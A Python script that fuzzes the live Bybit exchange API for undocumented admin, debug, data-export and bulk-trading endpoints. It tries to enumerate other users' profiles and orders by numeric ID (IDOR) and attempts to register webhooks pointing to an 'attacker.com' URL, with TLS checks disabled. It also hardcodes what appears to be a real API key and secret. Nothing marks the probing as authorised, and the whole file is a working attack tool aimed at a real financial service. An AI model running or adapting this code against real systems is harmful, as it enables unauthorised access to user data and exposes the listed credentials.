#!/usr/bin/env python3
"""
Aggressive API fuzzing for hidden/undocumented endpoints
"""
import requests
import subprocess
import time

API_KEY = "22JSr5zWpW0eReC6rE"
API_SECRET = "QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE_URL = "https://api.bybit.com"

requests.packages.urllib3.disable_warnings()

print("="*80)
print("AGGRESSIVE API FUZZING")
print("="*80)

# Wordlist of common API endpoints
endpoints = [
    # Admin/Internal
    "/v5/admin/users",
    "/v5/internal/config",
    "/v5/debug/info",
    "/v5/actuator/health",
    "/v5/status",
    "/v5/health",
    "/v5/metrics",
    
    # Bonus/Promo
    "/v5/bonus/claim",
    "/v5/promo/apply",
    "/v5/coupon/redeem",
    "/v5/reward/claim",
    "/v5/airdrop/claim",
    
    # Referral
    "/v5/referral/code",
    "/v5/referral/stats",
    "/v5/affiliate/earnings",
    
    # KYC/Verification
    "/v5/kyc/status",
    "/v5/verification/status",
    "/v5/identity/verify",
    
    # Trading bots
    "/v5/bot/list",
    "/v5/strategy/list",
    "/v5/copy-trading/followers",
    
    # Risk management
    "/v5/risk/score",
    "/v5/compliance/check",
    "/v5/aml/scan",
]

print("\n[1] Fuzzing Hidden Endpoints")
print("-" * 80)

found = []

for endpoint in endpoints:
    try:
        r = requests.get(f"{BASE_URL}{endpoint}", verify=False, timeout=2)
        
        if r.status_code not in [404, 403]:
            print(f"\n✓ {endpoint} - {r.status_code}")
            found.append(endpoint)
            
            try:
                data = r.json()
                ret_code = data.get('retCode')
                ret_msg = data.get('retMsg', '')
                
                print(f"  RetCode: {ret_code}")
                print(f"  Msg: {ret_msg[:80]}")
                
                # If returns data without auth - JACKPOT
                if ret_code == 0:
                    print(f"  🚨 RETURNS DATA WITHOUT AUTH!")
                    print(f"  Response: {str(data)[:200]}")
                    
            except:
                print(f"  Text: {r.text[:100]}")
                
    except:
        pass

# Test numeric ID enumeration
print("\n\n[2] Testing ID Enumeration")
print("-" * 80)

# Try to enumerate users, orders, etc
enum_endpoints = [
    "/v5/user/{id}/profile",
    "/v5/order/{id}",
    "/v5/trade/{id}",
]

for endpoint_template in enum_endpoints:
    for user_id in [1, 100, 1000, 999999]:
        endpoint = endpoint_template.replace('{id}', str(user_id))
        
        try:
            r = requests.get(f"{BASE_URL}{endpoint}", verify=False, timeout=2)
            
            if r.status_code == 200:
                print(f"\n⚠️  {endpoint} - {r.status_code}")
                try:
                    data = r.json()
                    if data.get('retCode') == 0:
                        print(f"  🚨 IDOR POSSIBLE! Got data for ID {user_id}")
                        print(f"  Data: {str(data)[:150]}")
                except:
                    pass
                    
        except:
            pass

# Test bulk operations (common source of bugs)
print("\n\n[3] Testing Bulk Operation Endpoints")
print("-" * 80)

bulk_endpoints = [
    "/v5/order/batch",
    "/v5/order/cancel-all",
    "/v5/position/close-all",
    "/v5/transfer/batch",
]

for endpoint in bulk_endpoints:
    try:
        # Try GET first (might leak info)
        r = requests.get(f"{BASE_URL}{endpoint}", verify=False, timeout=2)
        
        if r.status_code not in [404, 405]:
            print(f"\n{endpoint} - {r.status_code}")
            try:
                data = r.json()
                print(f"  RetCode: {data.get('retCode')}")
                print(f"  Msg: {data.get('retMsg', '')[:60]}")
            except:
                pass
                
    except:
        pass

# Test backup/export endpoints
print("\n\n[4] Testing Data Export/Backup Endpoints")
print("-" * 80)

export_endpoints = [
    "/v5/export/trades",
    "/v5/export/history",
    "/v5/backup/account",
    "/v5/download/statement",
    "/v5/report/generate",
]

for endpoint in export_endpoints:
    try:
        r = requests.get(f"{BASE_URL}{endpoint}", verify=False, timeout=2)
        
        if r.status_code not in [404, 403]:
            print(f"\n{endpoint} - {r.status_code}")
            try:
                data = r.json()
                print(f"  Response: {str(data)[:150]}")
            except:
                pass
                
    except:
        pass

# Test webhook/callback endpoints
print("\n\n[5] Testing Webhook/Callback Endpoints")
print("-" * 80)

webhook_endpoints = [
    "/v5/webhook/register",
    "/v5/callback/payment",
    "/v5/notify/trade",
]

for endpoint in webhook_endpoints:
    try:
        # Try to register a webhook to attacker server
        data = {"url": "https://attacker.com/webhook"}
        
        r = requests.post(
            f"{BASE_URL}{endpoint}",
            json=data,
            verify=False,
            timeout=2
        )
        
        if r.status_code not in [404, 403, 401]:
            print(f"\n{endpoint} - {r.status_code}")
            try:
                resp = r.json()
                print(f"  Response: {resp}")
                
                if resp.get('retCode') == 0:
                    print(f"  🚨 Webhook registered to attacker URL!")
                    
            except:
                pass
                
    except:
        pass

print("\n" + "="*80)
print(f"FOUND {len(found)} potentially interesting endpoints")
print("="*80)
